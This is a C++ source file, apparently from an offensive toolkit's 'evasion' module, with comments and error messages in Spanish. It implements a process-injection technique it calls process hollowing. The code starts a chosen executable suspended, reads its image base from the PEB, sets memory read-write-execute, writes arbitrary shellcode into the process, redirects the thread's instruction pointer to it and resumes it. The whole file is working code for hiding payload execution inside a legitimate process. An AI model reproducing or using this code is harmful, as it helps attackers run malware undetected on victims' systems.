#include "evasion/ProcessHollowing.h"

ProcessHollowing::ProcessHollowing() {}

PROCESS_INFORMATION ProcessHollowing::CreateSuspendedProcess(const std::string& targetProcess) {
	STARTUPINFOA si;
	PROCESS_INFORMATION pi;
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	if (!CreateProcessA(targetProcess.c_str(), NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
		std::cerr << "Error al crear el proceso suspendido: " << GetLastError() << std::endl;
		throw std::runtime_error("Error al crear el proceso suspendido");
	}

	return pi;
}

CONTEXT ProcessHollowing::GetProcessContext(HANDLE hThread) {
	CONTEXT ctx;
	ctx.ContextFlags = CONTEXT_FULL;
	if (!GetThreadContext(hThread, &ctx)) {
		std::cerr << "Error obteniendo el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error obteniendo el contexto del hilo");
	}

	return ctx;
}

PVOID ProcessHollowing::WriteShellcodeToProcess(HANDLE hProcess, const std::vector<unsigned char>& shellcode) {
	LPVOID shellcodeAddress = VirtualAllocEx(hProcess, NULL, shellcode.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcodeAddress == NULL) {
		std::cerr << "Error asignando memoria: " << GetLastError() << std::endl;
		throw std::runtime_error("Error asignando memoria");
	}

	if (!WriteProcessMemory(hProcess, shellcodeAddress, shellcode.data(), shellcode.size(), NULL)) {
		std::cerr << "Error escribiendo memoria: " << GetLastError() << std::endl;
		throw std::runtime_error("Error escribiendo memoria");
	}

	return shellcodeAddress;
}

VOID ProcessHollowing::SetContextAndResumeProcess(HANDLE hProcess, HANDLE hThread, CONTEXT& ctx, PVOID shellcodeAddress) {
	ctx.Rip = (DWORD64)shellcodeAddress;

	if (!SetThreadContext(hThread, &ctx)) {
		std::cerr << "Error ajustando el contexto del hilo: " << GetLastError() << std::endl;
		throw std::runtime_error("Error ajustando el contexto del hilo");
	}

	ResumeThread(hThread);
}

VOID ProcessHollowing::HollowProcess(const std::string& targetProcess, const std::vector<unsigned char>& shellcode) {
	try {
		// 1. Crear el proceso suspendido
		PROCESS_INFORMATION pi = CreateSuspendedProcess(targetProcess);

		// 2. Obtener el contexto del hilo
		CONTEXT ctx = GetProcessContext(pi.hThread);

		// 3. Leer la PEB para obtener la dirección base.
		DWORD64 imageBaseAddress;
		if (!ReadProcessMemory(pi.hProcess, (LPCVOID)(ctx.Rdx + 0x10), &imageBaseAddress, sizeof(DWORD64), NULL)) {
			std::cerr << "Error leyendo la memoria del proceso: " << GetLastError() << std::endl;
			throw std::runtime_error("Error leyendo la memoria del proceso");
		}

		std::cout << "Dirección base de la imagen : " << std::hex << imageBaseAddress << std::endl;

		// 4. Cambiar los permisos de memoria a r/x/w.
		DWORD oldProtect;
		if (!VirtualProtectEx(pi.hProcess, (LPVOID)imageBaseAddress, shellcode.size(), PAGE_EXECUTE_READWRITE, &oldProtect)) {
			std::cerr << "Error cambiando los permisos del proceso: " << GetLastError() << std::endl;
			throw std::runtime_error("Error cambiando los permisos del proceso");
		}

		// 5. Escribir el shellcode en memoria del proceso.
		PVOID shellcodeAddress = WriteShellcodeToProcess(pi.hProcess, shellcode);

		// 6. Modificar el contexto del hilo y reanudar el proceso
		SetContextAndResumeProcess(pi.hProcess, pi.hThread, ctx, shellcodeAddress);

		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}
	catch (const std::exception& e) {
		std::cerr << "Error en HollowProcess: " << e.what() << std::endl;
	}
}
